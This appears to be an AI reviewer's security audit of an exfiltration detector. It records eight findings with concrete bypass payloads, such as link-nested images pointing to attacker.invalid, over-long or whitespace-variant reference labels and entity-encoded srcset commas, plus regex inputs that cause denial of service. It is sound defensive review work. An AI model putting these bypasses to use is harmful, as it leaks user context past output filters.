| `T72-extra.log` | `91d10554beb85cfb50c2afb63ebdf872bbfd84ed8ff2cd51481198506b533248` |
| `T72-rerun-T42-exfil-attack.log` | `0646c50821177132e3e84528af5557b609f244fc13f109224de1496f879222ba` (= T66's) |
| `T72-rerun-T24-recheck2-exfil.log` | `8c9bfec0481cd22957d98f5cd17f4ee37eb9a2c2d1d86bd88593d36bf2abf519` (= T66's) |
| `T72-rerun-T42-charrefs.log` | `698d88993076fd92aad9b4a4e1f8235a0eac2b7490baa0d34d8d1c65cac1b452` (= T66's) |
| `T72-rerun-T53-extract.log` | `ad20286ba1aab3f8e810d3c84f6a8610ba96e6362e810b5caf476f50b80834ad` (= T66's) |
| `T72-rerun-T53-resolve.log` | `0603791031f8f078bf7481c787fc828859306e62f95cc2109bf253c8b53cb2e4` (= T66's) |
| `T72-rerun-T53-base.log` | `3416d62e56b7674e1208cd0bcb0aa9b3a3484f7baa50612c2819d56d8872254c` (differs from T66's by `[g07, g08]` — T67's disclosed `<base>` revert) |
| `T72-rerun-T53-boundary.log` | `398012ceb8654c55f51235fd5548e0576c3369c7cf8159c251ccb2ff69b3768d` (= T66's) |
| `T72-rerun-T42-boundary.log` | `7030455d39a56b12e98c75b8a74c699a3d488dbf9d04b4ac060bfe9151f957c8` (= T66's) |
| `T72-rerun-T24-recheck2-boundary.log` | `838399622c42414f63dbda91cdd9c61dd0b4f83982c630ec1c34f5abeff3064b` (= T66's) |
| `T72-rerun-T52-base.log` | `a04404db8a1571b102dc21ae85517b3345eb94496553c0fb8bded5811010dff2` (= T66's) |
| `T72-rerun-T46-surfaces.log` | `d8348c995f7686e16bac791caa429de427d31e02c4ec1b6c8fe6c48e0f959bf8` |
| `T72-rerun-T53-corpus.log` | `19dce5d19af9050e55b2c66b78e24d670e8f7b76a0fe4436334b227685d15031` |

Constraints honoured: read-only on every production, test and documentation file (hashes identical at
start and end); the only files written are `T72-review.md`, `T72-result.json`, the nine `T72-*.ts`
probes, the `T72-*` logs above and the two `.T72-hashes-*.txt` records. No `mkdtemp` fixture was needed.
No git state change of any kind (no `stash`, no `checkout`, no worktree entered), no flow CLI or state
change, no dependency or lockfile change, no `bun test` without file arguments, no network, no model
call. Every host is reserved or synthetic (`attacker.invalid`, `ok.example.org`, `cdn.example.org`,
`docs.example.org`, `ci.example.com`, `example.com`); nothing was contacted.

## Routing audit

- `graph_used: no (not-relevant)` — the dispatch named the file set exactly, and the graph answers from
  the last `keryx gdgraph build` while this checkout carries a large uncommitted multi-worker change
  set, so a graph answer could not be quoted as current.
- `wiki_used: no (not-relevant)` — the governing texts are the flow artifacts, `policies.md` and the
  frozen `acceptance-criteria.md`; all were read directly as the dispatch required.
- `ctx_used: partial, disclosed` — `bun src/cli.ts ctx rg` was used for the one code/test search
  (`MAX_REFERENCE_LABEL` in `exfil.test.ts`, raw at
  `.metaproject/data/gdctx/raw/2026-09-06T18-52-14-205Z_rg.log`). Probe and regression EXECUTION ran
  `bun` directly, because `ctx run`'s compaction elides the per-case rows that are this review's
  evidence — the same disclosure T46, T53, T63, T66 and T71 each made, and the dispatch's own
  instruction. Bounded `Read` with `offset`/`limit` was used for every file excerpt.
- `raw_rg_used: no` for project code. `cat`/`tail` were used only on **my own** probe logs and on two
  contract schema files that had to be reproduced verbatim to author a conforming artifact; each
  carried the `# keryx:raw` marker with its reason. No bare `rg`/`grep`/`find`/`sed` over project code.

```json keryx:findings
[
  {
    "id": "F-001",
    "global_id": "T72#F-001",
    "reviewer": "T72-independent-review-security-code+review-logic",
    "severity": "blocker",
    "file": "src/security/detect/exfil.ts",
    "line": 994,
    "symbol": "detectExfil (inline pass) / readBracketConstructs",
    "problem": "For `[![alt](URL)](href)` the outer bracket yields two inline readings; `.find` takes the OUTER one, `isImage` is read from the outer bracket's missing `!` so the construct is treated as a click-gated LINK, and `BRACKET_OPEN.lastIndex = inline.end` then advances past the whole construct so the inner `![alt](URL)` is never scanned by either pass. CommonMark renders an image inside a link's text; the detector releases it.",
    "impact": "`marked` emits <img src=\"https://attacker.invalid/p?ctx=CTX\"> for five measured spellings (inline, in prose, in a list, angle-bracket destination, shortcut/full reference image inside the link) and all five return from dispatchCallTool with isError:false and redaction.state:\"none\", pass prepareOutputForPersistence and validateOutputForTransport byte-identical, and reach the seam with the attacker host present. The carrier is the README badge idiom `[![build](badge)](ci)`, the most common markdown shape there is. Spelling bypass of a surface AC5 requires closed and policies.md:28 declares complete.",
    "suggested_fix": "Do not let an outer inline construct suppress the interior: when the chosen construct's description contains a `!`-prefixed bracket run, advance BRACKET_OPEN.lastIndex to open+1 rather than inline.end so the interior is rescanned; or prefer the reading whose description contains no nested construct (CommonMark's inner-most-wins for links), which flags the inner image and leaves the outer link click-gated. Add `[![a](U)](L)` to T71_CLASS_VECTORS.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-md.ts -> rendererConfirmedBypasses includes linkedInlineImage, linkedInlineImageNoBang, linkedShortcutImage, linkedFullRefImage, linkedInlineImageProse; raw .metaproject/data/gdctx/raw/T72-md.log (sha256 c9bb139f12cca2e8ecc288560e1957feb128a42c18b72269b452c7e9622a56bb). Boundaries: T72-boundary.ts -> leakingWithStateNone includes x1LinkedInlineImage, x2LinkedShortcutImage, x3LinkedImageInProse; raw T72-boundary.log (sha256 9fca2528a722ce85a32c3cbe69a8d824c30320ae320bd774d3a317a2580255b3). Real-world carrier: T72-extra.log -> badgeRow rendererImgSrcs=[\"https://attacker.invalid/p?ctx=CTX\",\"https://cdn.example.org/cov.svg\"] detectorFindings=0.",
    "confidence": "high",
    "dedupe_key": "exfil-image-nested-in-link-released",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:991-1013 (inline pass, .find + lastIndex advance)",
        "src/security/detect/exfil.ts:1027-1054 (reference pass, the same inline short-circuit at :1031-1038)",
        "docs/requirements/keryx-agent-first-core/policies.md:28 (the completeness claim over the four image spellings)"
      ],
      "enumeration_method": "Every CommonMark shape in which a covered construct can be CONTAINED by another bracket construct was enumerated (image-in-link, image-in-image, link-in-image) and each driven through `marked` and detectExfil in T72-md.ts / T72-md-diff.ts. image-in-image (`imageInsideImage`) resolves correctly to the outer destination and is NOT a member, so the class is image-in-link in all four image spellings."
    }
  },
  {
    "id": "F-002",
    "global_id": "T72#F-002",
    "reviewer": "T72-independent-review-security-code+review-logic",
    "severity": "blocker",
    "file": "src/security/detect/exfil.ts",
    "line": 565,
    "symbol": "MAX_REFERENCE_LABEL",
    "problem": "The 999-character label bound is justified as the standard's, so that refusing a longer label is 'renderer-faithful'. Measured against the markdown oracle this flow uses, it is not: `marked` resolves 1000- and 1200-character labels and emits the <img>. CommonMark's 999 limit is a conformance rule real renderers do not enforce, and the threat model is the rendering client. REFERENCE_DEF (:557) carries no matching bound, so the definition side still builds the entry the use side refuses to look up.",
    "impact": "Two counts. (1) The strict-SUPERSET claim fails: the old REFERENCE_USE's label group `([^\\]]+)` was unbounded and flagged `![a][<1000 chars>]`; the new scanner releases it, so an over-approximation the old patterns recorded DID vanish — the exact property T71's central argument asserts cannot happen. The 88-case extraction matrix contains no long label, so it could not have caught it. (2) It is the seventh instance of this file's recurring failure mode: a bound placed on the judgement, defeated by writing one more of whatever was bounded. Full, collapsed and shortcut forms are all affected and all reach the client with redaction.state:\"none\" at all four boundaries.",
    "suggested_fix": "Remove the bound from the classification path — the label is only a Map key, and an over-long key simply fails to match unless a definition of the same over-long label exists, which is precisely the case a renderer fetches. If a bound is kept for the cost reason the comment also gives, apply the SAME bound to REFERENCE_DEF so the two halves agree, and record it as a cost bound whose failure direction is release. No test pins the constant, so removing it breaks nothing.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-md-diff.ts -> supersetRegressions: [label1000, label1200]; rendererConfirmedBypasses additionally [shortcut1000, collapsed1000]; label998 and label999 flagged, so the cliff is exactly at the constant. Raw .metaproject/data/gdctx/raw/T72-md-diff.log (sha256 36735361593bf999cb4fcf1fb58cab9aa597054380b3023a6e9bc73c0eaa8a53). Boundaries: T72-boundary.log -> leakingWithStateNone includes x4LongLabelFullRef, x5LongLabelShortcut.",
    "confidence": "high",
    "dedupe_key": "exfil-max-reference-label-bound-releases-and-breaks-superset",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:565 (MAX_REFERENCE_LABEL, the constant)",
        "src/security/detect/exfil.ts:611-615 (the `usable` gate, its only reader)",
        "src/security/detect/exfil.ts:557 (REFERENCE_DEF, the unbounded other half)"
      ],
      "enumeration_method": "Every numeric or length bound introduced by T71 was located by reading the new code in full; there is exactly one (MAX_REFERENCE_LABEL). It was then swept at 998/999/1000/1200 characters against `marked` as renderer oracle and against a reconstruction of the pre-T71 REFERENCE_USE pattern, in T72-md-diff.ts."
    }
  },
  {
    "id": "F-003",
    "global_id": "T72#F-003",
    "reviewer": "T72-independent-review-security-code+review-logic",
    "severity": "blocker",
    "file": "src/security/detect/exfil.ts",
    "line": 551,
    "symbol": "INLINE_DESTINATION",
    "problem": "`\\(\\s*(?:<([^<>\\n]*)>|([^)\\s]+))[^)]*\\)` backtracks over every split of a run of non-`)` bytes, so one unterminated inline destination is quadratic in the run length. T71 replaced the per-open depth walk with an O(n) bracket index and measured only that shape; the destination grammar was carried over untouched, and the new scanner now offers it a start position at EVERY `[`, where the old `\\[[^\\]]*\\]\\(` had to align first. The two costs multiply.",
    "impact": "Measured on the shipped detector: `![a](` + a 100 000-byte non-`)` run costs 10 508 ms (growth exponent 1.99); `\"[\".repeat(6250) + \"![a](\" + \"A\".repeat(6250)` — 12 505 bytes — costs 263 049.7 ms (exponent ~3.0); a realistic 40 KB tool output with one unterminated markdown image costs 1 660 ms. On the cubic shape the shipped code is ~2x SLOWER than the two patterns it replaced (1054.5 vs 527.8 ms at 2 KB; 31 703.6 vs 14 395.9 ms at 6 KB). The floor is mandatory, cannot be skipped, and the payload is attacker-chosen: this is denial of service in a security control, and it falsifies T71-implementation Concern 3's two claims.",
    "suggested_fix": "Gate the destination regex on a cheap precondition before running it: if content.indexOf(\")\", descriptionEnd) is -1 no inline destination can match, so return immediately, and bound the regex's search window to that index. O(1) amortised with the bracket index already built, and it removes both the quadratic and the cubic shape. Then add the unterminated-destination shapes to T71-perf.ts.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-perf.ts -> shapesOverOneSecond: [unterminatedDestination=10508ms, unterminatedDestinationAngle=10182.3ms, openRunThenUnterminated=263049.7ms]; superLinearShapes with exponents 1.99 / 1.93. Raw .metaproject/data/gdctx/raw/T72-perf.log (sha256 7ae822c6cb0c1c8f5ee168f5dffffe6a03380e3ff16db2f9b835e138e6ada8cd). bun .../T72-perf2.ts -> shipped-vs-replaced ladder and realisticPayloadMs: 1660.3; raw T72-perf2.log (sha256 ddf594273c4f2db98749b41a79feef9f14459ce07807df0f5c4395289904a2fa).",
    "confidence": "high",
    "dedupe_key": "exfil-inline-destination-catastrophic-backtracking-dos",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:551 (INLINE_DESTINATION, the only backtracking destination grammar)",
        "src/security/detect/exfil.ts:588 (its exec, run up to twice per `[` in the input)",
        "src/security/detect/exfil.ts:557 (REFERENCE_DEF — measured linear, 18.2 ms at 213 KB)",
        "src/security/detect/exfil.ts:749 (META_REFRESH_CONTENT — terminates in ([\\s\\S]*)$, no backtracking)",
        "src/security/detect/exfil.ts:642 + readStartTag (measured linear, 13.1 ms at 200 KB)"
      ],
      "enumeration_method": "Every regex and every loop in the module was scaled across five sizes from 12.5 KB to 400 KB in T72-perf.ts and the growth exponent computed per shape from the last two measured sizes; the three super-linear shapes are the class and all three are the same sub-pattern."
    }
  },
  {
    "id": "F-004",
    "global_id": "T72#F-004",
    "reviewer": "T72-independent-review-security-code+review-logic",
    "severity": "major",
    "file": "src/security/detect/exfil.ts",
    "line": 1179,
    "symbol": "detectExfil srcset candidate split",
    "problem": "T71 closed the decode class at hasAttributeValue — the two gates that read an attribute value as a NAME-like token. The srcset branch reads an attribute value as a GRAMMAR and still parses the raw bytes. A renderer's tokenizer decodes the attribute value first (the very premise the gate fix rests on) and only then runs 'parse a srcset attribute', which splits on commas. So `srcset=\"https://cdn.../a.png&#44;https://attacker.../p 2x\"` is ONE candidate to this detector and TWO to a renderer.",
    "impact": "Under the empty default allowlist the whole raw string still resolves to the first host and is masked, so the default posture is safe. Under a NON-EMPTY allowlist containing the first candidate's host — the documented remedy for every false positive in this floor and the stated prerequisite for widening the deferred set — the finding disappears and the attacker candidate reaches the client unmasked. Measured on <img srcset> and <source srcset>, decimal and hex spellings.",
    "suggested_fix": "Split the srcset on decodeCharacterReferences(attribute.value) and map candidate offsets back to the raw span (the raw/classify separation UrlHit.classify already provides for <meta refresh>); or, simpler and in this floor's own direction, when the decoded value contains a comma the raw value does not, classify every decoded candidate and mask the whole attribute value.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-srcset.ts -> three rows verdict=BYPASS with allowlist=[\"cdn.example.org\"], each printing the renderer's two candidates beside the detector's one. Raw .metaproject/data/gdctx/raw/T72-srcset.log (sha256 7957eee55ca5f2f44c88e70806c89d3c370152c09a29ee6560f733abe18514ff).",
    "confidence": "high",
    "dedupe_key": "exfil-srcset-split-on-raw-value",
    "blocking_merge": false,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:1179 (srcset candidate split)",
        "src/security/detect/exfil.ts:1087 and :1091 (hasAttributeValue — decodes, clean)",
        "src/security/detect/exfil.ts:1104 (metaRefreshDestination — decodes, clean)",
        "src/security/detect/exfil.ts:1139 (base/href -> renderableUrl — decodes, clean)",
        "src/security/detect/exfil.ts:1157 (FETCHING_ATTRIBUTES[attribute.name] — a NAME, which a tokenizer does not decode; confirmed clean)",
        "src/security/detect/exfil.ts:1094 (empty-value skip — a raw-empty value cannot decode to a non-empty one; clean)"
      ],
      "enumeration_method": "detectExfil's HTML loop (exfil.ts:1059-1195) was read line by line and every branch that consults an attribute was turned into a row in T72-gates.ts with the question 'does a renderer decode this before reading it'. Six branches; five are name-keyed or already decode, the srcset split is the one member."
    }
  },
  {
    "id": "F-005",
    "global_id": "T72#F-005",
    "reviewer": "T72-independent-review-security-code+review-logic",
    "severity": "major",
    "file": "src/security/detect/exfil.ts",
    "line": 1042,
    "symbol": "refs.get(construct.label.trim().toLowerCase())",
    "problem": "CommonMark's link-label matching normalises with Unicode case folding AND by collapsing consecutive internal whitespace (a newline included) to a single space. The detector normalises with trim().toLowerCase() only, at both the definition side (:974) and the use side (:1042). A use whose label differs from its definition only in internal whitespace resolves for a renderer and not for the floor.",
    "impact": "`marked` renders <img src=\"https://attacker.invalid/...\"> for `![a][b  c]` against `[b c]: URL`, and for a label carrying a newline, while detectExfil returns 0 findings. Two more cheap spellings of a surface policies.md declares complete. Pre-existing, but T71 rewrote this resolution and re-asserted completeness over it.",
    "suggested_fix": "Normalise both sides with CommonMark's own rule: label.trim().replace(/\\s+/g, \" \").toLowerCase(), applied identically at :974 and :1042.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-gates.ts -> bypasses includes labelInnerWhitespace:BYPASS and labelNewlineInLabel:BYPASS, each printing marked's emitted <img> beside detectorFindings=0. Raw .metaproject/data/gdctx/raw/T72-gates.log (sha256 adc010a85b6c03d5ca60af5c6f37ba22d416e2582a6424020acfef4bd6f3d83f).",
    "confidence": "high",
    "dedupe_key": "exfil-reference-label-whitespace-normalisation",
    "blocking_merge": false,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:974 (definition side normalisation)",
        "src/security/detect/exfil.ts:1042 (use side normalisation)"
      ],
      "enumeration_method": "CommonMark's link-label matching rule has three components (Unicode case folding, internal-whitespace collapse, entity decoding); each was driven against `marked` and detectExfil in T72-gates.ts. Case folding passes (labelUnicodeCase); whitespace collapse fails at both sites; entity decoding is a non-member because `marked` does not resolve `![a][b&#99;]` either (labelEntitySpelling)."
    }
  },
  {
    "id": "F-006",
    "global_id": "T72#F-006",
    "reviewer": "T72-independent-review-security-code+review-logic",
    "severity": "major",
    "file": "docs/requirements/keryx-agent-first-core/policies.md",
    "line": 28,
    "symbol": "### Auto-fetch floor: покрытая и непокрытая область (the covered list)",
    "problem": "T66#F-003(a) allowed the completeness claim to stay only after the spelling gaps were closed. T71 kept «перечень полный, не пример» and widened the markdown entry to «во всех четырёх написаниях CommonMark». Five shapes a reader of that sentence would expect covered are released, four of them renderer-confirmed: an image inside a link in two spellings (T72#F-001), a reference label past 999 characters (T72#F-002), a label differing only by internal whitespace (T72#F-005), and a srcset candidate behind an entity-encoded comma under a non-empty allowlist (T72#F-004). Parts (b) and (c) of T66#F-003 ARE fixed and verified in both directions; this finding is only about (a).",
    "impact": "The acceptance criterion 'the recorded documentation matches the implementation in both directions' is not met. A normative document that overstates completeness is worse than the silence it replaced, because the next round trusts it instead of re-deriving — which is exactly what happened between T46 and T66.",
    "suggested_fix": "Fix F-001/F-002/F-004/F-005 and keep the sentence; if any is deferred, replace «перечень полный, не пример» with a named exception list rather than dropping the claim, since the value of the subsection is that it is checkable. The same correction is owed to the module header block (exfil.ts:10-21), which names 'all three CommonMark spellings' with the same gap. Bump Version again when the sentence changes.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-doc.ts -> 77 rows; docSaysReleasedButFlagged: []; propertyFailures: []; docSaysCoveredButReleased: [revLinkedInlineImage, revLinkedShortcutImage, revLongLabelFullRef, revLabelWhitespace, revSrcsetCharrefComma]; parity: false. Raw .metaproject/data/gdctx/raw/T72-doc.log (sha256 88d82662f2d56b6f8a8cb47e7d1850aa10765ba9d10408769a8becbdec2e543d).",
    "confidence": "high",
    "dedupe_key": "policies-md-auto-fetch-completeness-still-false",
    "blocking_merge": false,
    "related_skill": "review-logic",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "docs/requirements/keryx-agent-first-core/policies.md:28",
        "src/security/detect/exfil.ts:10-21 (the module header's covered list, T66#F-003's third site)"
      ],
      "enumeration_method": "Both lists were transcribed independently from policies.md lines 28/30/32/34/36/38 into 77 executable fragments in T72-doc.ts (38 covered, 25 released, 14 property rows) and put to the detector in both directions; a reverse-completeness block adds every shape this review measured released that the sentence implies is covered."
    }
  },
  {
    "id": "F-007",
    "global_id": "T72#F-007",
    "reviewer": "T72-independent-review-security-code+review-logic",
    "severity": "minor",
    "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T71-implementation.md",
    "line": null,
    "symbol": "Concerns section 3 / 'A performance defect the repair introduced'",
    "problem": "'The shipped shape is faster than what it replaces on the same input' is true for the one input measured and false for the unterminated-destination shape, where the shipped code is ~2x slower. 'the floor as a whole is still linear-per-file' is false: two measured shapes are quadratic and one is cubic. The module comment at exfil.ts:488-496 repeats the first claim.",
    "impact": "The disclosure is what the next round will read as the settled measurement, and it would conclude the performance question is closed. Recorded separately from T72#F-003 because that finding is about the code and this is about the artifact a future round inherits.",
    "suggested_fix": "After T72#F-003 is fixed, restate the claim with the shape it applies to and record the measured growth exponents for the shapes that were not in the original eight.",
    "evidence": ".metaproject/data/gdctx/raw/T72-perf.log and T72-perf2.log (as T72#F-003).",
    "confidence": "high",
    "dedupe_key": "t71-perf-claim-overgeneralised",
    "blocking_merge": false,
    "related_skill": "review-logic",
    "learning_candidate": false
  },
  {
    "id": "F-008",
    "global_id": "T72#F-008",
    "reviewer": "T72-independent-review-security-code+review-logic",
    "severity": "info",
    "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-gates.ts",
    "line": null,
    "symbol": "the HTMLRewriter oracle column",
    "problem": "Measured: Bun's HTMLRewriter (lol-html) returns the RAW attribute source, not the tokenizer's decoded value — getAttribute(\"type\") on type=\"&#105;mage\" returns &#105;mage, and on type=\"&amp;#105;mage\" returns &amp;#105;mage. It is a faithful oracle for attribution (which element owns which attribute) and for tag boundaries, which is what T53 and T66 used it for, but it cannot confirm the character-reference decoding premise that T66#F-001 and this whole repair rest on. That premise is sound and rests on the spec text, not on any oracle in this checkout.",
    "impact": "None on any verdict here — the premise was stated explicitly wherever this review used it rather than attributed to the oracle. Recorded so the next round does not treat 'an independent HTML tokenizer shipped with the runtime' as settling a decoding question, and so a future decode-related finding is not 'confirmed' by a probe that cannot see decoding at all.",
    "suggested_fix": "When a decoding question arises, use a full parser (parse5, or Response->DOM) as the oracle, or state the spec clause as the premise; do not report a rewriter's getAttribute as the renderer's value.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T72-extra.ts -> rows singlePass / doubleEncoded / doubleEncodedMeta. Raw .metaproject/data/gdctx/raw/T72-extra.log (sha256 91d10554beb85cfb50c2afb63ebdf872bbfd84ed8ff2cd51481198506b533248).",
    "confidence": "high",
    "dedupe_key": "htmlrewriter-not-a-decoding-oracle",
    "blocking_merge": false,
    "related_skill": "review-security-code",
    "learning_candidate": true
  }
]
```
